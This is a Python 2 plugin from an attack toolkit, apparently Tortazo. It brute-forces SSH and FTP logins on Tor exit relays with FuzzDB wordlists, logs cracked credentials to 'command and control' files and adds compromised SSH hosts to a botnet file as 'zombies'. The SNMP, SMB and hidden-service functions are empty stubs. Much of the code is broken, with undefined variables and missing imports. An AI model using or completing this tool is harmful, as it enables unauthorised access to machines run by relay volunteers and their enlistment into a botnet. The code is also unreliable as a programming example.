# coding=utf-8
'''
Created on 22/01/2014

#Author: Adastra.
#twitter: @jdaanial

bruterPlugin.py

bruterPlugin is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

bruterPlugin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Tortazo; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
'''

from core.tortazo.pluginManagement.BasePlugin import BasePlugin
from stem.version import Version
from prettytable import PrettyTable
import paramiko
from smb.SMBConnection import SMBConnection

class bruterPlugin(BasePlugin):
    '''
    Class to  implement a bruteforce plugin against TOR exit nodes and hidden services in the deep web.
    '''

    def __init__(self, torNodes=[]):
        BasePlugin.__init__(self, torNodes, 'bruterPlugin')
        self.setPluginDetails('bruterPlugin', 'Bruteforce plugin for services in the deep web.', '1.0', 'Adastra: @jdaanial')
        if len(torNodes) > 0:
            self.info("[*] bruterPlugin Initialized!")
        self.bruteForceData = {}
        for torNode in self.torNodes:
            openPorts = []
            for port in torNode.openPorts:
                openPorts.append(port.port)
                if len(openPorts) > 0:
                    self.bruteForceData[torNode.host] = openPorts
            print self.bruteForceData


    def __del__(self):
        if len(self.torNodes) > 0:
            self.info("[*] bruterPlugin Destroyed!")

    def setDictSeparator(self, separator):
        print "[+] Setting separator '%s' for dictionary files. Every line en the file must contain <user><separator><passwd>" %(separator)
        self.separator = separator

    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM SSH BRUTEFORCE ATTACKS.#########################################################################
    ################################################################################################################################################
    def sshBruterOnRelay(self, relay, dictFile=None, port=22, force=False):
        if self.niktoData.has_key(ipAddress) == False:
            print "[-] IP Adress %s not found in the relays" %(ipAddress)
            return
        if port not in self.niktoData[ipAddress] and force == False:
            print "[-] Port %s in the selected relay is 'closed' in the information recorded in database. If this really open, use the parameter 'force=True' of this function"
            return

        print "[+] Starting SSH BruteForce mode against %s on port %s" %(relay, str(port))
        if dictFile is None:
            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
            usersList = self.getUserlistFromFuzzDB()
            passList = self.getPasslistFromFuzzDB()

            stop_attack = False
            for user in usersList:
                if stop_attack:
                    break
                for passwd in passList:
                    if self.performSSHConnection(user, passwd):
                        stop_attack = True
                        break
        else:
            print "[+] Using the 'dictFile' stored in %s. Verifing the file. " %(dictFile)
            import os
            if os.path.exists(dictFile) == False or os.path.isfile(dictFile) == False:
                print "[-] The file selected doesn't exists or is a directory."
                return
            for line in open(dictFile, "r").readlines():
                [user, passwd] = line.strip().split(self.separator)
                if self.performSSHConnection(user, passwd):
                    break

            
    def sshBruterOnAllRelays(self, dictFile=None, port=22, force=False):
        for relay in self.bruteForceData:
            self.sshBruterOnRelay(relay=relay, dictFile=dictFile, port=port, force=force)

    def sshBruterOnHiddenService(self, onionService, dictFile=None):
        if dictFile is None:
            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."


    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM FTP BRUTEFORCE ATTACKS.#########################################################################
    ################################################################################################################################################
    def ftpBruterOnRelay(self, relay, dictFile=None):
        print "[+] Buruteforce on relay %s " %(relay)
        ftpFileName = 'commandandcontrolftp.txt'
        print "[+] Trying Anonymous access in: %s " %(self.torNode.host)
        try:
            ftpClient = ftplib.FTP(self.torNode.host)
            ftpClient.login()
            print "[+] Anonymous access allowed in: %s " %(self.torNode.host)
            ftpFile = open(ftpFileName, 'a')
            entry = '%s:%s:%s' %(self.torNode.host, 'anonymous', 'anonymous')
            ftpFile.write(entry+'\n')
            ftpFile.close()
        except:
            print "[-] Anonymous access is not allowed in: %s "%(self.torNode.host)

        if(self.cli.dictFile is not None and os.path.exists(self.cli.dictFile)):
            print "[+] Reading the Passwords file %s " %(self.cli.dictFile)
            for line in open(self.cli.dictFile, "r").readlines():
                [user, passwd] = line.strip().split()
                try :
                    ftpClient = ftplib.FTP(self.torNode.host)
                    ftpClient.login(user, passwd)
                except:
                    continue
                if ftpClient:
                    print "[+] FTP Bruteforcer Success ... username: %s and passoword %s is VALID! " % (user, passwd)
                    ftpClient.quit()
                    ftpFile = open(ftpFileName, 'a')
                    entry =  '%s:%s:%s' %(self.torNode.host, user, passwd)
                    ftpFile.write(entry+'\n')
                    ftpFile.close()
                    ftpClient.close()
        else:
            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
            usersList = self.getUserlistFromFuzzDB()
            passList = self.getPasslistFromFuzzDB()

            stop_attack = False
            for user in usersList:
                if stop_attack:
                    break
                for passwd in passList:
                    try :
                        ftpClient = ftplib.FTP(self.torNode.host)
                        ftpClient.login(user, passwd)
                    except:
                        continue
                    if ftpClient:
                        print "[+] FTP Bruteforcer Success ... username: %s and passoword %s is VALID! " % (user, passwd)
                        ftpClient.quit()
                        ftpFile = open(ftpFileName, 'a')
                        entry =  '%s:%s:%s' %(self.torNode.host, user, passwd)
                        ftpFile.write(entry+'\n')
                        ftpFile.close()
                        ftpClient.close()
                        stop_attack=True
            
            

    def ftpBruterOnAllRelays(self, relay, dictFile=None):
        for relay in self.bruteForceData:
            self.ftpBruterOnRelay(relay, dictFile)
        

    def ftpBruterOnHiddenService(self, onionService, dictFile=None):
        if dictFile is None:
            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."            


    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM SNMP BRUTEFORCE ATTACKS.########################################################################
    ################################################################################################################################################
    def snmpBruterOnRelay(self, relay, dictFile=None):
        if dictFile is None:
            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."

    def snmpBruterOnAllRelays(self, dictFile=None):
        if dictFile is None:
            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."

    def snmpBruterOnHiddenService(self, onionService, dictFile=None):
        if dictFile is None:
            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."            


    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM SMB BRUTEFORCE ATTACKS.#########################################################################
    ################################################################################################################################################
    def smbBruterOnRelay(self, relay, dictFile=None):
        if dictFile is None:
            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."
            

    def smbBruterOnAllRelays(self, dictFile=None):
        if dictFile is None:
            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."

    def smbBruterOnHiddenService(self, onionService, dictFile=None):
        if dictFile is None:
            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."


    ################################################################################################################################################
    ###########################   COMMON FUNCTIONS.   ##############################################################################################
    ################################################################################################################################################
    def performSSHConnection(self, user, passwd):
        '''
        Perform SSH Connections using the tortazo_botnet.bot file.
        '''
        tortazoFile = 'tortazo_botnet.bot'
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        sshFileName = 'commandandcontrolssh.txt'
        try:
            client.connect(self.torNode.host, username=user, password=passwd)
        except paramiko.AuthenticationException:
            return False
        print "[+] SSH Bruteforce Success ... username: %s and password %s is VALID! " % (user, passwd)
        client.close()
        sshFile = open(sshFileName, 'a')
        entry =  '%s:%s:%s' %(self.torNode.host, user, passwd)
        sshFile.write(entry+'\n')
        sshFile.close()
        print "[+] Updating the file 'tortazo_botnet.bot' with the new Zombie"
        try:
            tortazoFd = open(tortazoFile, 'a')
        except:
            print sys.exc_info()

        #host:user:pass:port:nickname
        nickname = '--'
        if self.torNode.nickName:
            nickname = self.torNode.nickName
        entryBotnet = '%s:%s:%s:%s:%s' %(self.torNode.host, user, passwd, '22', nickname)
        content = open(tortazoFile, 'r').readlines()
        if entryBotnet in content:
            print "[-] Entry duplicated. Server already added in the 'tortazo_botnet.bot' file"
        else:
            tortazoFd.write(entryBotnet)
            print "[+] Entry %s added" %(entry)
            tortazoFd.close()
            return True

    def getUserlistFromFuzzDB(self):
        '''
        Reads:
        fuzzdb/wordlists-user-passwd/names/namelist.txt
        fuzzdb/wordlists-user-passwd/passwds/john.txt
        fuzzdb/wordlists-user-passwd/unix-os/unix-users.txt
        fuzzdb/wordlists-user-passwd/faithwriters.txt

        and returns a list of words (used as possible usernames)
        '''
        self.cli.logger.debug(term.format("[+] Generating users list using the files in FuzzDB", term.Color.GREEN))
        users = []
        try:
            namelist = open('fuzzdb/wordlists-user-passwd/names/namelist.txt', 'r')
            johnlist = open('fuzzdb/wordlists-user-passwd/passwds/john.txt', 'r')
            unixusers = open('fuzzdb/wordlists-user-passwd/unix-os/unix_users.txt', 'r')
            faithwriters = open('fuzzdb/wordlists-user-passwd/faithwriters.txt', 'r')
        except:
            print sys.exc_info()

        for userNameList in namelist.readlines():
            users.append(userNameList)

        for userJohnList in johnlist.readlines():
            users.append(userJohnList)

        for userunix in unixusers.readlines():
            users.append(userunix)

        for userfaithwriter in faithwriters.readlines():
            users.append(userfaithwriter)
        return users

    def getPasslistFromFuzzDB(self):
        '''
        Reads:
        fuzzdb/wordlists-user-passwd/passwds/john.txt
        fuzzdb/wordlists-user-passwd/unix-os/unix-passwords.txt
        fuzzdb/wordlists-user-passwd/weaksauce.txt

        and returns a list of words (used as possible usernames)
        '''
        self.cli.logger.debug(term.format("[+] Generating passwords list using the files in FuzzDB", term.Color.GREEN))
        passwords = []
        johnlist = open('fuzzdb/wordlists-user-passwd/passwds/john.txt', 'r')
        unixpasswords = open('fuzzdb/wordlists-user-passwd/unix-os/unix_passwords.txt', 'r')
        weaksauce = open('fuzzdb/wordlists-user-passwd/passwds/weaksauce.txt', 'r')
        for johnpass in johnlist.readlines():
            passwords.append(johnpass)

        for unixpass in unixpasswords.readlines():
            passwords.append(unixpass)

        for wealsauce in weaksauce.readlines():
            passwords.append(wealsauce)

        return passwords
    
        
    def help(self):
        print "[*] Functions availaible available in the Plugin..."
        tableHelp = PrettyTable(["Function", "Description", "Example"])
        tableHelp.padding_width = 1
        tableHelp.padding_width = 1
        tableHelp.add_row(['help', 'Help Banner', 'self.help()'])
        tableHelp.add_row(['printRelaysFound', 'Table with the relays found.', 'self.printRelaysFound()'])
        print tableHelp
